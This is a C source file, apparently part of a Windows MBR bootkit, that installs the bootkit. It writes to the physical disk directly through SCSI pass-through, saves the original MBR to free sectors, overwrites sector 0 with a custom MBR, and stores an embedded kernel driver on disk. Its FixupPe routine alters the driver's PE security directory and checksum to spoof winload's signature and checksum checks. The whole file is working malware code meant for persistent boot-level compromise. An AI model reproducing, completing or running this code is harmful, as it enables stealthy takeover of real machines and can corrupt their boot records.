#include "bootkit.h"

UINT8 Driver[] =
{
#include "driver.h"
};

static PVOID malloc(SIZE_T Size)
{
    return VirtualAlloc(NULL, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

static BOOL free(PVOID Address)
{
    return VirtualFree(Address, 0, MEM_RELEASE);
}

static NTSTATUS AccessDisk(PVOID Buffer, ULONG SectorCount, ULONG StartSector, enum ScsiOperation Op)
{
    STATUS_INIT;
    HANDLE file;
    DWORD bytesReturned;
    SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER request;

    file = CreateFile(STR_PHYSDRIVE0,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (INVALID_HANDLE_VALUE == file)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 无法访问硬盘\n");
        goto fail;
    }

    memset(&request, 0, sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER));
    request.sptd.Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
    request.sptd.CdbLength = 10; // 使用 10 字节 CDB
    request.sptd.SenseInfoLength = SPT_SENSE_LENGTH;
    request.sptd.DataTransferLength = SectorCount * SECTOR_LENGTH;
    request.sptd.TimeOutValue = 2;
    request.sptd.DataBuffer = Buffer;
    request.sptd.SenseInfoOffset = offsetof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, ucSenseBuf);

    if (Op == ScsiRead)
    {
        request.sptd.DataIn = SCSI_IOCTL_DATA_IN;
        request.sptd.Cdb[0] = SCSIOP_READ;
    }
    else if (Op == ScsiWrite)
    {
        request.sptd.DataIn = SCSI_IOCTL_DATA_OUT;
        request.sptd.Cdb[0] = SCSIOP_WRITE;
    }
    else
    {
        status = STATUS_INVALID_PARAMETER;
        LOG("[-] 无效的操作类型\n");
        goto fail;
    }

    request.sptd.Cdb[2] = HIBYTE(HIWORD(StartSector)); // 逻辑块地址
    request.sptd.Cdb[3] = LOBYTE(HIWORD(StartSector));
    request.sptd.Cdb[4] = HIBYTE(LOWORD(StartSector));
    request.sptd.Cdb[5] = LOBYTE(LOWORD(StartSector));
    request.sptd.Cdb[7] = HIBYTE(SectorCount); // 传输长度
    request.sptd.Cdb[8] = LOBYTE(SectorCount);

    if (!DeviceIoControl(
        file,
        IOCTL_SCSI_PASS_THROUGH_DIRECT,
        &request,
        sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER),
        &request,
        sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER),
        &bytesReturned,
        NULL))
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 磁盘操作失败\n");
        goto fail;
    }

    if (request.sptd.DataTransferLength != SectorCount * SECTOR_LENGTH)
    {
        status = STATUS_DATA_ERROR;
        LOG("[-] 无效的传输长度\n");
        goto fail;
    }

    status = STATUS_SUCCESS;
    LOG("[+] 磁盘操作成功\n");

fail:
    if (INVALID_HANDLE_VALUE != file)
    {
        CloseHandle(file);
    }
    return status;
}

// 查找空闲扇区，扇区后跟随空扇区计数
static NTSTATUS FindEmptySectors(UINT32 Count, PUINT32 Sector)
{
    STATUS_INIT;
    char* sector = NULL;
    UINT32 temp_count = 0;

    sector = malloc(SECTOR_LENGTH);
    if (NULL == sector)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 内存分配失败\n");
        goto fail;
    }

    UINT32 i = 1;
    for (; i < UINT16_MAX; i++)
    {
        status = AccessDisk(sector, 1, i - 1, ScsiRead);
        if (!NT_SUCCESS(status))
        {
            LOG("[-] 读取扇区失败\n");
            goto fail;
        }

        UINT32 j = 0;
        for (; j < SECTOR_LENGTH; j++)
        {
            if (sector[j])
            {
                break;
            }
        }
        if (j == SECTOR_LENGTH) // 如果扇区为空
        {
            temp_count++;
        }
        else
        {
            temp_count = 0;
        }

        if (temp_count == Count)
        {
            i -= Count;
            break;
        }
    }
    if (i == UINT16_MAX) // 从 BIOS int13（非扩展）读取的最大值
    {
        status = STATUS_NOT_FOUND;
        LOG("[-] 找不到足够的空闲扇区\n");
        goto fail;
    }

    *Sector = i;
    status = STATUS_SUCCESS;
    LOG("[+] 找到空闲扇区\n");

fail:
    free(sector);
    return status;
}

static NTSTATUS FixupPe(PUINT8 Base, UINT32 Size)
{
    STATUS_INIT;
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)Base;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)(Base + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER64* opHeader = &ntHeader->OptionalHeader;
    LARGE_INTEGER fileSize;
    UINT32 fixupSize = 0;

    HANDLE file = CreateFileA(
        "C:\\Windows\\System32\\drivers\\filecrypt.sys",
        FILE_READ_ATTRIBUTES, FALSE, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == file)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 无法打开驱动文件\n");
        goto fail;
    }

    if (!GetFileSizeEx(file, &fileSize) || fileSize.LowPart < Size)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 获取文件大小失败\n");
        goto fail;
    }

    if (fileSize.LowPart < Size)
    {
        status = STATUS_INVALID_BUFFER_SIZE;
        LOG("[-] 驱动程序文件过大\n");
        goto fail;
    }

    fixupSize = fileSize.LowPart;
    fixupSize -= opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
    fixupSize -= opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size;

    // 增加大小以通过 winload!BlImgGetValidatedCertificateLocation 检查
    opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size += fixupSize;

    // 修正校验和 (见 winload!BlUtlCheckSum)
    opHeader->CheckSum -= Size;
    opHeader->CheckSum += (UINT16)fixupSize;
    opHeader->CheckSum = (UINT16)((opHeader->CheckSum >> 16) + opHeader->CheckSum);
    opHeader->CheckSum += (UINT16)(fixupSize >> 16);
    opHeader->CheckSum = (UINT16)((opHeader->CheckSum >> 16) + opHeader->CheckSum) + fileSize.LowPart;

    status = STATUS_SUCCESS;
    LOG("[+] 修复 PE 头部以进行欺骗\n");

fail:
    if (INVALID_HANDLE_VALUE != file)
    {
        CloseHandle(file);
    }
    return status;
}

NTSTATUS Install(const UINT8 Bootkit[], UINT16 BootkitSize)
{
    STATUS_INIT;
    UINT8* mbr = NULL;
    UINT8 bkSectorCount = CALC_SECTOR_COUNT(BootkitSize);
    UINT8 driverSectorCount = CALC_SECTOR_COUNT(sizeof(Driver));
    UINT8* bkBuf = NULL;
    UINT8* driverBuf = NULL;
    UINT32 origMbrSector = 0;
    UINT32 driverSector = 0;

    LOG("[*] 正在安装 bootkit...\n");

    mbr = malloc(SECTOR_LENGTH);
    if (NULL == mbr)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 内存分配失败\n");
        goto fail;
    }

    bkBuf = malloc(bkSectorCount * SECTOR_LENGTH);
    if (NULL == bkBuf)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 内存分配失败\n");
        goto fail;
    }

    memset(bkBuf, 0, bkSectorCount * SECTOR_LENGTH);
    memcpy(bkBuf, Bootkit, BootkitSize);

    driverBuf = malloc(driverSectorCount * SECTOR_LENGTH);
    if (NULL == driverBuf)
    {
        status = STATUS_SPACES_EXTENDED_ERROR;
        LOG("[-] 内存分配失败\n");
        goto fail;
    }

    memset(driverBuf, 0, driverSectorCount * SECTOR_LENGTH);
    memcpy(driverBuf, Driver, sizeof(Driver));

    status = FixupPe(driverBuf, sizeof(Driver));
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 修复 PE 头部失败\n");
        goto fail;
    }

    status = AccessDisk(mbr, 1, 0, ScsiRead); // 读取 MBR
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 读取 MBR 失败\n");
        goto fail;
    }

    if (MBR_MAGIC != *(PUINT16)(&mbr[SECTOR_LENGTH - sizeof(UINT16)]))
    {
        status = STATUS_NOT_FOUND;
        LOG("[-] 找不到 MBR 魔术值\n");
        goto fail;
    }

    // 检查是否已经安装
    UINT16 i = 0;
    for (; i < MBR_DISK_SIGNATURE_OFFSET - 4; i++)
    {
        UINT16* nextCheck = (UINT16*)(bkBuf + 4 + i);

        // 忽略需要修复的字节
        if (ORIG_MBR_MAGIC == *nextCheck ||
            DRV_SIZE_MAGIC == *nextCheck ||
            DRV_SECT_MAGIC == *nextCheck)
        {
            i++;
            continue;
        }

        if (*(UINT8*)nextCheck != *(mbr + 4 + i))
        {
            break;
        }
    }
    if (i == MBR_DISK_SIGNATURE_OFFSET - 4)
    {
        status = STATUS_ALREADY_INITIALIZED;
        LOG("[-] Bootkit 已经安装\n");
        goto fail;
    }

    // 查找足够大的空闲区域
    status = FindEmptySectors(bkSectorCount + driverSectorCount, &origMbrSector);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 无法找到所需的磁盘空间\n");
        goto fail;
    }
    driverSector = origMbrSector + bkSectorCount;

    // 修正魔术值
    for (int i = 0; i < SECTOR_LENGTH; i++)
    {
        switch (*(UINT16*)(bkBuf + i))
        {
        case ORIG_MBR_MAGIC:
        {
            // 告诉 bootkit 原始 MBR 的写入位置
            *(UINT16*)(bkBuf + i) = origMbrSector + 1;
            break;
        }
        case DRV_SIZE_MAGIC:
        {
            // 告诉 bootkit 驱动程序的大小
            *(UINT16*)(bkBuf + i) = driverSectorCount;
            break;
        }
        case DRV_SECT_MAGIC:
        {
            // 告诉 bootkit 驱动程序的写入位置
            *(UINT16*)(bkBuf + i) = driverSector + 1;
            break;
        }
        }
    }

    // 保留原始磁盘签名和分区表
    memcpy(
        bkBuf + MBR_DISK_SIGNATURE_OFFSET,
        mbr + MBR_DISK_SIGNATURE_OFFSET,
        SECTOR_LENGTH - MBR_DISK_SIGNATURE_OFFSET);

    // 将原始 MBR 写入空闲扇区
    status = AccessDisk(mbr, 1, origMbrSector, ScsiWrite);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 写入原始 MBR 失败\n");
        goto fail;
    }

    // 用自定义 MBR 覆盖第一个扇区
    status = AccessDisk(bkBuf, 1, 0, ScsiWrite);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 写入自定义 MBR 失败\n");
        goto fail;
    }

    // 将 bootkit 剩余部分写入磁盘
    status = AccessDisk(bkBuf + SECTOR_LENGTH, bkSectorCount - 1, origMbrSector + 1, ScsiWrite);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 写入 bootkit 失败\n");
        goto fail;
    }

    // 存储驱动程序
    status = AccessDisk(driverBuf, driverSectorCount, driverSector, ScsiWrite);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 写入驱动程序失败\n");
        goto fail;
    }

    LOG("[+] 安装完成。请在重启后查看效果。\n");

fail:
    free(driverBuf);
    free(bkBuf);
    free(mbr);
    return status;
}
